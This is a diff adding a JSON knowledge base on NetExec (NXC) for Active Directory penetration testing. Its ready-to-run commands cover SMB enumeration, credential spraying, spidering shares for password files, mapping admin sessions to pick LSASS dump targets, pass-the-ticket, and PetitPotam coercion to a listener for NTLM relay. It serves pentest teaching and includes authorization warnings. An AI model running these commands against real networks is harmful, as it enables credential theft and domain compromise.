@@ -1,0 +1,380 @@
+{
+  "knowledge_base_part": 1,
+  "categories": [
+    {
+      "id": "nxc_basics",
+      "name": "NXC/NetExec Basics",
+      "topics": [
+        {
+          "title": "What is NXC/NetExec",
+          "keywords": ["nxc", "netexec", "crackmapexec", "cme", "what is nxc", "what is netexec", "network exploitation", "ad pentesting"],
+          "difficulty": "beginner",
+          "content": "NetExec (NXC) is the modern, actively maintained successor to CrackMapExec (CME). It is a network service exploitation tool used by penetration testers and red teamers to automate the assessment of large Active Directory environments. NXC authenticates to multiple network services (SMB, LDAP, WinRM, RDP, SSH, FTP, MSSQL, VNC, WMI), enumerates information, sprays credentials, executes commands, and dumps secrets from a single command-line interface. The original CrackMapExec was created by byt3bl33d3r (Marcello Salvati) and became the standard for AD pentesting. In late 2023, the project was forked and renamed to NetExec by the community under the Pennyw0rth organization on GitHub because the original CME repository was archived. All modern usage should use the 'nxc' command, not 'crackmapexec' or 'cme'. The config directory changed from ~/.cme/ to ~/.nxc/ and the database command from 'cmedb' to 'nxcdb'.",
+          "examples": [
+            {
+              "command": "nxc smb 192.168.1.0/24",
+              "explanation": "Scan an entire /24 subnet for hosts with SMB (port 445) open, revealing OS, hostname, domain, SMB signing status, and SMBv1 support without any authentication",
+              "use_case": "First step on any internal penetration test — discover the network landscape"
+            },
+            {
+              "command": "nxc --help",
+              "explanation": "Display NXC help showing all available protocol modules and global options",
+              "use_case": "When you need to see what protocols and options are available"
+            },
+            {
+              "command": "nxc smb --help",
+              "explanation": "Display all options available for the SMB protocol module",
+              "use_case": "When you need to see SMB-specific flags and options"
+            }
+          ],
+          "warnings": ["Always use 'nxc' not 'crackmapexec' or 'cme' — the old commands are deprecated", "Ensure you have written authorization before running NXC against any network"],
+          "best_practices": ["Install via pipx for isolated environment: pipx install netexec", "On Kali Linux 2024+, NXC is pre-installed via apt"],
+          "related_cves": [],
+          "related_topics": ["NXC Installation", "Protocol Modules Overview", "CME to NXC Migration"]
+        },
+        {
+          "title": "NXC Installation",
+          "keywords": ["install netexec", "install nxc", "pip install", "pipx install", "kali netexec", "setup nxc"],
+          "difficulty": "beginner",
+          "content": "NXC can be installed through several methods depending on your platform. On Kali Linux 2024 and later, NetExec is included in the default repositories and can be installed via 'sudo apt update && sudo apt install netexec'. The recommended installation method for non-Kali systems is pipx ('pipx install netexec') which creates an isolated virtual environment. You can also use pip ('pip install netexec') though this may conflict with system packages. For the latest development version, clone from GitHub ('git clone https://github.com/Pennyw0rth/NetExec.git') and install locally with 'pipx install .'. After installation, verify with 'nxc --version'. The configuration directory is ~/.nxc/ which contains the database, logs, and module configurations.",
+          "examples": [
+            {
+              "command": "sudo apt update && sudo apt install netexec",
+              "explanation": "Install NetExec from Kali Linux repositories",
+              "use_case": "Standard installation on Kali Linux"
+            },
+            {
+              "command": "pipx install netexec",
+              "explanation": "Install NetExec in an isolated environment using pipx",
+              "use_case": "Recommended installation on non-Kali Linux systems"
+            }
+          ],
+          "warnings": ["Ensure Python 3.7+ is installed", "pip install may conflict with system packages — prefer pipx"],
+          "best_practices": ["Use pipx for isolated installation", "Verify installation with nxc --version"],
+          "related_cves": [],
+          "related_topics": ["What is NXC/NetExec", "Protocol Modules Overview"]
+        },
+        {
+          "title": "NXC Basic Syntax and Structure",
+          "keywords": ["nxc syntax", "nxc command format", "nxc usage", "basic nxc", "nxc command structure", "-u", "-p", "-d"],
+          "difficulty": "beginner",
+          "content": "Every NXC command follows the pattern: nxc <protocol> <target(s)> [options]. The protocol is the service to target (smb, ldap, winrm, rdp, ssh, ftp, mssql, vnc, wmi). The target can be a single IP, CIDR range, IP range, hostname, or file containing targets. Common authentication options include -u for username, -p for password, -H for NTLM hash, -d for domain, --local-auth for local authentication, and -k for Kerberos. Multiple usernames or passwords can be specified with multiple -u or -p flags, or by providing files. Target specification supports single IPs (192.168.1.10), CIDR notation (192.168.1.0/24), ranges (192.168.1.1-50), and files (targets.txt with one target per line). The --port flag overrides the default port, -t sets the thread count, and --timeout sets the connection timeout in seconds.",
+          "examples": [
+            {
+              "command": "nxc smb 192.168.1.10 -u admin -p Password123",
+              "explanation": "Authenticate to SMB on a single host using username and password",
+              "use_case": "Basic credential validation against a single target"
+            },
+            {
+              "command": "nxc smb 192.168.1.0/24 -u admin -p Password123",
+              "explanation": "Authenticate to SMB across an entire /24 subnet",
+              "use_case": "Check where credentials work across the network"
+            },
+            {
+              "command": "nxc smb targets.txt -u users.txt -p passwords.txt",
+              "explanation": "Authenticate using lists of targets, usernames, and passwords from files",
+              "use_case": "Large-scale credential testing from prepared wordlists"
+            }
+          ],
+          "warnings": ["Using -u and -p with files will try all combinations (spray) unless --no-bruteforce is used", "Reduce thread count (-t) for OPSEC or to avoid network congestion"],
+          "best_practices": ["Always specify the domain with -d for clarity", "Use --local-auth when testing local accounts", "Start with a single target before scanning ranges"],
+          "related_cves": [],
+          "related_topics": ["Target Specification", "Authentication Options", "Protocol Modules Overview"]
+        },
+        {
+          "title": "Understanding NXC Output Symbols",
+          "keywords": ["[+]", "[-]", "[*]", "Pwn3d!", "pwned", "success", "failure", "info", "nxc output", "output symbols", "admin access", "local administrator"],
+          "difficulty": "beginner",
+          "content": "NXC uses three primary symbols in its output to indicate results. The [+] symbol (green) indicates success — a successful authentication or operation. When [+] is followed by (Pwn3d!), it means the authenticated user has local administrator privileges on the target host. For SMB this means access to ADMIN$ or C$ shares; for WinRM it means PowerShell Remoting access; for MSSQL it means sysadmin privileges. The [-] symbol (red) indicates failure — a failed authentication attempt. Common failure status codes include STATUS_LOGON_FAILURE (wrong credentials), STATUS_ACCOUNT_LOCKED_OUT (too many failed attempts), STATUS_ACCOUNT_DISABLED (disabled account), STATUS_PASSWORD_EXPIRED (expired password), and STATUS_PASSWORD_MUST_CHANGE (must change at next logon). The [*] symbol (blue) provides informational output such as host details, OS version, domain name, SMB signing status, and enumeration results. The (Pwn3d!) flag is the most critical indicator — it means you can execute commands, dump secrets, and fully compromise the host.",
+          "examples": [
+            {
+              "command": "SMB         192.168.1.10    445    DC01             [+] CORP.LOCAL\\administrator:Password123 (Pwn3d!)",
+              "explanation": "Successful authentication with local admin access confirmed — the user can execute commands and dump credentials on DC01",
+              "use_case": "Interpreting NXC output to identify admin-accessible hosts"
+            },
+            {
+              "command": "SMB         192.168.1.10    445    DC01             [-] CORP.LOCAL\\jsmith:WrongPass STATUS_LOGON_FAILURE",
+              "explanation": "Failed authentication — wrong username or password for the CORP.LOCAL domain on DC01",
+              "use_case": "Identifying failed login attempts during credential testing"
+            },
+            {
+              "command": "SMB         192.168.1.10    445    DC01             [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:CORP.LOCAL) (signing:True) (SMBv1:False)",
+              "explanation": "Informational line showing OS, hostname, domain, SMB signing status (True = relay attacks blocked), and SMBv1 status",
+              "use_case": "Gathering host information during initial enumeration"
+            }
+          ],
+          "warnings": ["STATUS_ACCOUNT_LOCKED_OUT means you've triggered a lockout — stop spraying immediately", "(Pwn3d!) means full admin access — handle with care and document for the report"],
+          "best_practices": ["Always look for (Pwn3d!) to identify admin access", "Check signing:True/False to identify relay targets", "Monitor for STATUS_ACCOUNT_LOCKED_OUT during spraying"],
+          "related_cves": [],
+          "related_topics": ["SMB Signing", "Password Spraying", "NXC Output Formats"]
+        },
+        {
+          "title": "Protocol Modules Overview",
+          "keywords": ["smb", "ldap", "winrm", "rdp", "ssh", "ftp", "mssql", "vnc", "wmi", "protocol", "module", "port 445", "port 389", "port 5985", "port 3389", "port 22", "port 21", "port 1433", "port 5900", "port 135"],
+          "difficulty": "beginner",
+          "content": "NXC supports nine protocol modules, each targeting a specific network service. SMB (port 445) is the most versatile — it handles file share enumeration, user/group enumeration, credential attacks, command execution via multiple methods, and secret dumping. LDAP (port 389/636) queries Active Directory for users, groups, trusts, computer objects, and supports Kerberoasting and AS-REP roasting. WinRM (port 5985/5986) enables PowerShell Remoting and command execution on hosts where WinRM is enabled. RDP (port 3389) checks Remote Desktop Protocol access and can take screenshots. SSH (port 22) authenticates and executes commands on Linux/Unix systems and network devices. FTP (port 21) checks FTP authentication and anonymous access. MSSQL (port 1433) targets Microsoft SQL Server for authentication, query execution, and xp_cmdshell command execution. VNC (port 5900) checks VNC authentication. WMI (port 135) uses Windows Management Instrumentation for command execution and queries. Each protocol has its own set of modules and capabilities accessible via 'nxc <protocol> --help'.",
+          "examples": [
+            {
+              "command": "nxc smb 192.168.1.0/24",
+              "explanation": "Scan for SMB services across the subnet — reveals OS, hostname, domain, signing status",
+              "use_case": "Initial network discovery on internal penetration tests"
+            },
+            {
+              "command": "nxc winrm 192.168.1.0/24 -u admin -p Password123",
+              "explanation": "Check WinRM access across the subnet — (Pwn3d!) means PowerShell Remoting is available",
+              "use_case": "Finding hosts where you can execute PowerShell commands remotely"
+            }
+          ],
+          "warnings": ["Not all protocols are available on all targets — SMB is the most universally available on Windows"],
+          "best_practices": ["Start with SMB for initial enumeration", "Use LDAP for AD-specific queries", "Check WinRM as an alternative execution method if SMB is restricted"],
+          "related_cves": [],
+          "related_topics": ["SMB Enumeration", "LDAP Module", "WinRM Module", "MSSQL Module"]
+        },
+        {
+          "title": "Target Specification and Authentication",
+          "keywords": ["target", "CIDR", "range", "targets.txt", "file input", "single IP", "subnet", "-u", "-p", "-H", "-d", "--local-auth", "-k", "--use-kcache", "kerberos", "null session", "guest", "domain auth", "local auth"],
+          "difficulty": "beginner",
+          "content": "NXC supports flexible target specification: single IPs (192.168.1.10), multiple IPs space-separated (192.168.1.10 192.168.1.11), CIDR ranges (192.168.1.0/24), IP ranges (192.168.1.1-50), hostnames (dc01.corp.local), and files containing targets one per line (targets.txt). Authentication supports domain credentials (-u user -p pass -d DOMAIN), local credentials (-u user -p pass --local-auth), NTLM hashes (-u user -H 'LM:NT' or -u user -H 'NT_only'), Kerberos tickets (-k --use-kcache with KRB5CCNAME environment variable), null sessions (-u '' -p ''), and guest access (-u guest -p ''). Domain authentication is the default; if -d is omitted, NXC uses the domain reported by the target. Local authentication (--local-auth) checks against the local SAM database instead of Active Directory — essential when using credentials from SAM dumps or targeting workgroup machines. Multiple usernames and passwords can be specified with repeated -u/-p flags or via files. The --no-bruteforce flag pairs credentials line-by-line instead of trying all combinations.",
+          "examples": [
+            {
+              "command": "nxc smb 192.168.1.0/24 -u administrator -p 'Password123' -d CORP.LOCAL",
+              "explanation": "Authenticate as a domain administrator against all hosts in the /24 subnet",
+              "use_case": "Checking admin access across the network with domain credentials"
+            },
+            {
+              "command": "nxc smb 192.168.1.0/24 -u administrator -p 'LocalAdmin!' --local-auth",
+              "explanation": "Authenticate with local admin credentials against all hosts — checks local SAM not AD",
+              "use_case": "Testing for local admin password reuse across workstations"
+            },
+            {
+              "command": "nxc smb 192.168.1.10 -u '' -p ''",
+              "explanation": "Attempt a null session with empty username and password",
+              "use_case": "Checking if the host allows unauthenticated enumeration via null sessions"
+            },
+            {
+              "command": "export KRB5CCNAME=/tmp/admin.ccache && nxc smb dc01.corp.local -k --use-kcache",
+              "explanation": "Authenticate using a Kerberos ticket cache file instead of username/password",
+              "use_case": "Using a stolen or forged Kerberos ticket for pass-the-ticket attacks"
+            }
+          ],
+          "warnings": ["Kerberos auth requires hostnames not IPs", "--local-auth is required for local account authentication", "Null sessions are rarely allowed on modern Windows but always worth checking"],
+          "best_practices": ["Always try null sessions and guest access first", "Use --local-auth when testing SAM-derived credentials", "Specify -d explicitly for clarity"],
+          "related_cves": [],
+          "related_topics": ["Pass-the-Hash", "Pass-the-Ticket", "Kerberos Authentication", "Null Sessions"]
+        }
+      ]
+    },
+    {
+      "id": "smb_enumeration",
+      "name": "SMB Enumeration",
+      "topics": [
+        {
+          "title": "SMB Host Discovery and OS Fingerprinting",
+          "keywords": ["smb scan", "os detection", "host discovery", "fingerprint", "signing", "SMBv1", "domain", "hostname", "Windows Server", "Windows 10", "Build"],
+          "difficulty": "beginner",
+          "content": "Running NXC SMB against a target range without credentials performs unauthenticated SMB enumeration, revealing valuable information about every host that responds on port 445. The output line format is: SMB IP PORT HOSTNAME [*] OS_VERSION (name:HOSTNAME) (domain:DOMAIN) (signing:True/False) (SMBv1:True/False). The OS version field shows the exact Windows version and build number (e.g., 'Windows Server 2019 Build 17763 x64' or 'Windows 10 Build 19041 x64'). The signing field is critical: signing:True means SMB signing is required (relay attacks blocked, typically domain controllers), while signing:False means signing is not required (vulnerable to NTLM relay). The SMBv1 field indicates whether the legacy SMBv1 protocol is enabled (potential EternalBlue vulnerability, MS17-010). Domain controllers can usually be identified by signing:True and 'Server' in the OS string. Use --gen-relay-list to automatically generate a file containing only IPs with SMB signing disabled.",
+          "examples": [
+            {
+              "command": "nxc smb 192.168.1.0/24",
+              "explanation": "Scan the entire /24 subnet for SMB hosts without authentication, revealing OS, hostname, domain, signing status for every responding host",
+              "use_case": "First command on any internal penetration test — map the network"
+            },
+            {
+              "command": "nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt",
+              "explanation": "Scan the subnet and generate a file containing only IPs where SMB signing is disabled (potential NTLM relay targets)",
+              "use_case": "Preparing target list for ntlmrelayx NTLM relay attacks"
+            },
+            {
+              "command": "nxc smb 10.10.10.0/24 10.10.20.0/24",
+              "explanation": "Scan multiple subnets simultaneously for SMB hosts",
+              "use_case": "Discovering hosts across multiple network segments"
+            }
+          ],
+          "warnings": ["Scanning large ranges generates significant network traffic", "SMBv1:True hosts may be vulnerable to EternalBlue (MS17-010) — report this finding"],
+          "best_practices": ["Always run this as the first step on internal engagements", "Save the gen-relay-list output for potential relay attacks", "Identify DCs by signing:True"],
+          "related_cves": ["CVE-2017-0144"],
+          "related_topics": ["SMB Signing", "NTLM Relay Attacks", "Null Sessions"]
+        },
+        {
+          "title": "Share Enumeration",
+          "keywords": ["--shares", "shares", "ADMIN$", "C$", "IPC$", "share permissions", "READ", "WRITE", "network shares", "file shares", "enumerated shares"],
+          "difficulty": "beginner",
+          "content": "The --shares flag enumerates network shares on the target and reports the current user's permissions on each share. Output shows the share name, permissions (READ, WRITE, or READ,WRITE), and remark/description. Default administrative shares include ADMIN$ (Remote Admin — maps to C:\\Windows), C$ (Default share — maps to C:\\), and IPC$ (Remote IPC — used for named pipe communication). If ADMIN$ or C$ show READ,WRITE permissions, the user has local administrator access. Custom shares like IT_Share, HR_Data, Backups reveal the organization's file sharing structure and may contain sensitive data. Shares can be enumerated across an entire subnet to map all accessible file shares. Null session share enumeration (with empty credentials) may reveal publicly accessible shares on misconfigured systems. The permissions shown reflect the authenticated user's effective access — different users will see different permissions.",
+          "examples": [
+            {
+              "command": "nxc smb 192.168.1.10 -u jsmith -p 'Password123' --shares",
+              "explanation": "Enumerate all shares on the target and show the authenticated user's read/write permissions for each share",
+              "use_case": "Finding accessible file shares and identifying writable shares for potential file placement"
+            },
+            {
+              "command": "nxc smb 192.168.1.0/24 -u jsmith -p 'Password123' --shares",
+              "explanation": "Enumerate shares across the entire subnet to map all file shares the user can access",
+              "use_case": "Comprehensive share mapping during the enumeration phase"
+            },
+            {
+              "command": "nxc smb 192.168.1.10 -u '' -p '' --shares",
+              "explanation": "Attempt to enumerate shares via null session without credentials",
+              "use_case": "Checking for misconfigured shares accessible without authentication"
+            }
+          ],
+          "warnings": ["ADMIN$ and C$ access means local admin — document this for the report", "Writable shares can be used for SCF/LNK attacks to capture hashes"],
+          "best_practices": ["Enumerate shares early in the engagement to identify sensitive data locations", "Check null session share access before authenticated enumeration", "Look for shares with WRITE permission for hash capture opportunities"],
+          "related_cves": [],
+          "related_topics": ["Share Spidering", "spider_plus Module", "File Transfer Operations"]
+        },
+        {
+          "title": "Share Spidering",
+          "keywords": ["--spider", "--spider-folder", "--pattern", "--depth", "spider", "file search", "sensitive files", "credential files", "web.config", "unattend.xml", "Groups.xml", "passwords in files"],
+          "difficulty": "intermediate",
+          "content": "Share spidering recursively browses the contents of network shares to find files matching specific patterns. NXC provides built-in spidering with the --spider flag (specify the share name) combined with --pattern (regex or comma-separated extensions to match). The --spider-folder flag restricts spidering to a specific subdirectory within the share, and --depth limits recursion depth. Common patterns for finding credentials include 'pass|cred|secret|key|config|backup|password'. Files commonly containing credentials include: web.config and app.config (.NET connection strings), PowerShell scripts (.ps1) and batch files (.bat, .vbs) with hardcoded passwords, unattend.xml and sysprep.xml (deployment credentials), KeePass databases (.kdbx), RDP files (.rdp), certificate files (.pfx, .p12, .pem), and Groups.xml (Group Policy Preferences with AES-encrypted but crackable passwords using gpp-decrypt). For more advanced spidering, use the spider_plus module which indexes all files and outputs structured JSON results. Spider_plus supports exclusions and can be configured to only look at specific file types or skip certain directories.",
+          "examples": [
+            {
+              "command": "nxc smb 192.168.1.10 -u jsmith -p 'Password123' --spider IT_Share --pattern 'pass|cred|secret|key'",
+              "explanation": "Spider the IT_Share share recursively, looking for files with 'pass', 'cred', 'secret', or 'key' in their names",
+              "use_case": "Finding credential-containing files on file shares during enumeration"
+            },
+            {
+              "command": "nxc smb 192.168.1.10 -u jsmith -p 'Password123' --spider C$ --pattern txt,xml,config,ini,bat,ps1 --depth 3",
+              "explanation": "Spider the C$ admin share for script and configuration files, limited to 3 levels of directory depth",
+              "use_case": "Searching for configuration files and scripts on a host where you have admin access"
+            },
+            {
+              "command": "nxc smb 192.168.1.30 -u jsmith -p 'Password123' -M spider_plus -o EXCLUDE_DIR=Windows,ProgramData",
+              "explanation": "Use the spider_plus module for thorough share indexing, excluding Windows and ProgramData directories to reduce noise",
+              "use_case": "Comprehensive file share audit for sensitive data discovery"
+            }
+          ],
+          "warnings": ["Spidering large shares generates significant traffic and takes time", "Downloading sensitive files must be authorized in the scope of engagement", "spider_plus saves results to ~/.nxc/logs/"],
+          "best_practices": ["Start with targeted patterns before broad spidering", "Use --depth to limit recursion on large shares", "Check Groups.xml for GPP passwords using gpp_password module"],
+          "related_cves": ["CVE-2014-1812"],
+          "related_topics": ["Share Enumeration", "spider_plus Module", "GPP Passwords"]
+        },
+        {
+          "title": "User and Group Enumeration",
+          "keywords": ["--users", "--groups", "--local-groups", "domain users", "domain groups", "domain admins", "enterprise admins", "user enumeration", "group enumeration", "membercount", "service accounts", "svc_"],
+          "difficulty": "beginner",
+          "content": "User enumeration (--users) retrieves the list of domain user accounts via the SAM-R protocol or LDAP, showing the username and description for each account. This output is valuable for building a username wordlist for password spraying, identifying service accounts (often prefixed with svc_) which may have SPNs suitable for Kerberoasting, and identifying admin accounts for targeted attacks. Group enumeration (--groups) retrieves domain groups with their member counts — key groups to look for include Domain Admins, Enterprise Admins, Schema Admins, and any custom admin groups like IT_Admins or SQL_Admins. Local group enumeration (--local-groups) shows groups on a specific host, most importantly the local Administrators group membership. These commands require valid domain credentials and are typically run against a domain controller. The --users and --groups flags can be used with the SMB or LDAP protocol modules. For environments where SAM-R enumeration is restricted by GPO, RID brute forcing (--rid-brute) provides an alternative user enumeration method.",
+          "examples": [
+            {
+              "command": "nxc smb 192.168.1.10 -u jsmith -p 'Password123' --users",
+              "explanation": "Enumerate all domain users showing their names and descriptions",
+              "use_case": "Building a username list for password spraying or identifying high-value accounts"
+            },
+            {
+              "command": "nxc smb 192.168.1.10 -u jsmith -p 'Password123' --groups",
+              "explanation": "Enumerate all domain groups with member counts",
+              "use_case": "Identifying privileged groups and their sizes for targeting"
+            },
+            {
+              "command": "nxc smb 192.168.1.20 -u jsmith -p 'Password123' --local-groups",
+              "explanation": "Enumerate local groups on a specific host, showing Administrators group membership",
+              "use_case": "Finding which users have local admin access on a particular workstation or server"
+            }
+          ],
+          "warnings": ["User enumeration via SAM-R may be restricted by GPO on modern domains", "Use --rid-brute as a fallback if --users returns empty results"],
+          "best_practices": ["Run against a DC for domain-wide results", "Look for service accounts (svc_*) as Kerberoasting targets", "Save user lists for password spraying campaigns"],
+          "related_cves": [],
+          "related_topics": ["RID Brute Forcing", "Password Spraying", "Kerberoasting"]
+        },
+        {
+          "title": "Session and Logged-On User Enumeration",
+          "keywords": ["--sessions", "--loggedon-users", "active sessions", "logged on", "logged in", "who is logged in", "admin sessions", "domain admin sessions", "session enumeration"],
+          "difficulty": "intermediate",
+          "content": "Session enumeration (--sessions) reveals which users have active SMB sessions on the target host, showing the source IP address and the domain\\username of each connected user. This is valuable for identifying where high-privilege users (domain admins, service accounts) are currently connected, which helps plan credential theft attacks — if a domain admin has an active session on a server, dumping LSASS on that server will yield their credentials. Logged-on user enumeration (--loggedon-users) shows users who are interactively logged into the target host, including their logon server. Both commands can be run across subnets to map privileged user activity network-wide. The combination of session and loggedon-users data creates a map of 'who is where' — essential for targeted lateral movement. Running these across the entire subnet identifies admin workstations and shows which servers domain admins regularly access. This information directly informs which hosts to target for credential dumping.",
+          "examples": [
+            {
+              "command": "nxc smb 192.168.1.10 -u jsmith -p 'Password123' --sessions",
+              "explanation": "Enumerate active SMB sessions on DC01, showing source IPs and usernames of currently connected users",
+              "use_case": "Finding where domain admins and service accounts are currently connected"
+            },
+            {
+              "command": "nxc smb 192.168.1.20 -u jsmith -p 'Password123' --loggedon-users",
+              "explanation": "Show users interactively logged into WS01 with their logon server",
+              "use_case": "Identifying which users are active on a target host before dumping credentials"
+            },
+            {
+              "command": "nxc smb 192.168.1.0/24 -u jsmith -p 'Password123' --sessions --loggedon-users",
+              "explanation": "Map active sessions and logged-on users across the entire subnet",
+              "use_case": "Building a complete picture of privileged user activity network-wide"
+            }
+          ],
+          "warnings": ["Session enumeration requires valid credentials", "Large subnet scans generate significant traffic"],
+          "best_practices": ["Look for domain admin sessions — those hosts are high-value targets for LSASS dumping", "Run across the subnet to find admin workstations", "Combine with --shares to find admin workstations with sensitive data"],
+          "related_cves": [],
+          "related_topics": ["LSASS Credential Dump", "Lateral Movement", "Credential Theft"]
+        },
+        {
+          "title": "Password Policy Enumeration",
+          "keywords": ["--pass-pol", "password policy", "lockout threshold", "lockout duration", "lockout counter", "minimum password length", "password complexity", "account lockout", "password spraying safety"],
+          "difficulty": "beginner",
+          "content": "The --pass-pol flag retrieves the domain password policy from the target, which is essential information before any password spraying campaign. The output includes: minimum password length, password history length, maximum password age, password complexity requirements, minimum password age, Account Lockout Threshold (number of failed attempts before lockout), Reset Account Lockout Counter (time before the failed attempt counter resets), and Locked Account Duration (how long a locked account stays locked). The most critical fields for spray safety are the lockout threshold and reset counter. Safe spraying rule: never exceed (threshold - 2) attempts per reset period. For example, with a threshold of 5 and a 30-minute reset, try at most 3 passwords per 35-minute window. If the lockout threshold is 0, there is no lockout policy and you can spray more aggressively (but this is rare in production environments). Always retrieve the password policy before spraying — locking out production accounts will end your engagement early and damage your reputation.",
+          "examples": [
+            {
+              "command": "nxc smb 192.168.1.10 -u jsmith -p 'Password123' --pass-pol",
+              "explanation": "Retrieve the domain password policy showing lockout thresholds, reset counters, complexity requirements, and password age settings",
+              "use_case": "MANDATORY before any password spraying campaign to determine safe spray parameters"
+            },
+            {
+              "command": "nxc smb 192.168.1.10 -u '' -p '' --pass-pol",
+              "explanation": "Attempt to retrieve password policy via null session (may work on misconfigured DCs)",
+              "use_case": "Getting password policy before you have any valid credentials"
+            }
+          ],
+          "warnings": ["ALWAYS check password policy before spraying", "Locking out accounts can end an engagement prematurely", "Stay 2 below the lockout threshold per reset period"],
+          "best_practices": ["Run this command before any password spray", "If threshold is 5 and reset is 30 min, try max 3 passwords per 35-minute window", "Document the password policy in your report"],
+          "related_cves": [],
+          "related_topics": ["Password Spraying", "Account Lockout", "Credential Attacks"]
+        },
+        {
+          "title": "RID Brute Forcing",
+          "keywords": ["--rid-brute", "rid brute", "RID", "relative identifier", "SidTypeUser", "SidTypeGroup", "user enumeration", "500", "512", "513", "brute force RID"],
+          "difficulty": "intermediate",
+          "content": "RID (Relative Identifier) brute forcing enumerates users and groups by cycling through Security Identifier (SID) values. Each domain object has a SID composed of the domain SID plus a unique RID. Well-known RIDs include 500 (Administrator), 501 (Guest), 502 (krbtgt), 512 (Domain Admins), 513 (Domain Users), 514 (Domain Guests), 515 (Domain Computers), 516 (Domain Controllers). Custom user accounts typically start from RID 1000+. The --rid-brute flag accepts an optional maximum RID value (default is around 4000). For larger domains, increase this: --rid-brute 10000 or --rid-brute 20000. RID brute forcing is especially valuable when SAM-R enumeration is blocked by Group Policy (a common hardening measure), when you only have a null session or guest access, and when you need to discover users that --users might miss. The output shows each RID, the domain\\username, and the account type (SidTypeUser for user accounts, SidTypeGroup for groups). This technique works through the LSARPC named pipe and may succeed even when other enumeration methods are restricted.",
+          "examples": [
+            {
+              "command": "nxc smb 192.168.1.10 -u jsmith -p 'Password123' --rid-brute",
+              "explanation": "Enumerate users and groups by brute forcing RID values from 500 to ~4000",
+              "use_case": "User enumeration when SAM-R is restricted or for comprehensive user discovery"
+            },
+            {
+              "command": "nxc smb 192.168.1.10 -u jsmith -p 'Password123' --rid-brute 10000",
+              "explanation": "Extended RID brute force up to RID 10000 for larger domains with many objects",
+              "use_case": "Discovering all users in large Active Directory environments"
+            },
+            {
+              "command": "nxc smb 192.168.1.10 -u '' -p '' --rid-brute",
+              "explanation": "Attempt RID brute forcing via null session",
+              "use_case": "Enumerating users without any valid credentials on misconfigured systems"
+            }
+          ],
+          "warnings": ["Generates many LSARPC queries — may be logged and detected", "Increasing the RID range increases scan time linearly"],
+          "best_practices": ["Use when --users returns empty or restricted results", "Increase the RID range for large domains (10000+)", "Filter output for SidTypeUser to get just user accounts"],
+          "related_cves": [],
+          "related_topics": ["User Enumeration", "Null Sessions", "Password Spraying"]
+        },
+        {
+          "title": "SMB Signing and Relay Target Identification",
+          "keywords": ["signing", "signing:True", "signing:False", "SMB signing", "--gen-relay-list", "relay", "ntlmrelayx", "NTLM relay", "relay targets", "man-in-the-middle"],
+          "difficulty": "intermediate",
+          "content": "SMB signing (message signing) is a security feature that adds a cryptographic signature to each SMB message, preventing man-in-the-middle attacks and NTLM relay. In NXC output, signing:True means SMB signing is required — the host cannot be a target for NTLM relay attacks. Signing:False means signing is not required — the host is vulnerable to relay. By default, domain controllers require signing while member servers and workstations do not. NXC's --gen-relay-list flag automatically generates a file containing only IPs where signing is disabled, ready to use with ntlmrelayx. The relay attack workflow: 1) Use NXC to generate the relay target list, 2) Start Responder to capture NTLM authentication, 3) Start ntlmrelayx with the relay target list, 4) Optionally use NXC's PetitPotam module to coerce authentication from a high-privilege account. If the captured authentication belongs to a user who is admin on a relay target, you get code execution. This is one of the most reliable initial access techniques on internal penetration tests because SMB signing is disabled by default on most Windows systems except DCs.",
+          "examples": [
+            {
+              "command": "nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt",
+              "explanation": "Scan the subnet and generate a file containing only IPs where SMB signing is disabled, suitable for NTLM relay attacks",
+              "use_case": "Preparing for NTLM relay attacks with ntlmrelayx — first step in relay attack chain"
+            },
+            {
+              "command": "nxc smb 192.168.1.10 -u jsmith -p 'Password123' -M petitpotam -o LISTENER=10.10.10.5",
+              "explanation": "Coerce the target to authenticate back to your listener at 10.10.10.5 via PetitPotam (MS-EFSRPC abuse)",
+              "use_case": "Triggering NTLM authentication from a DC/server to relay to signing-disabled targets"
+            }
+          ],
+          "warnings": ["Relay attacks only work against hosts with signing:False", "Domain controllers typically have signing:True by default", "PetitPotam requires at least low-privilege domain credentials"],
+          "best_practices": ["Always generate a relay target list as part of initial enumeration", "Report SMB signing disabled as a finding — it enables relay attacks", "Combine with Responder and ntlmrelayx for the full attack chain"],
+          "related_cves": ["CVE-2021-36942"],
+          "related_topics": ["NTLM Relay Attacks", "PetitPotam", "Responder", "ntlmrelayx"]
+        }
+      ]
+    }
+  ]
+}
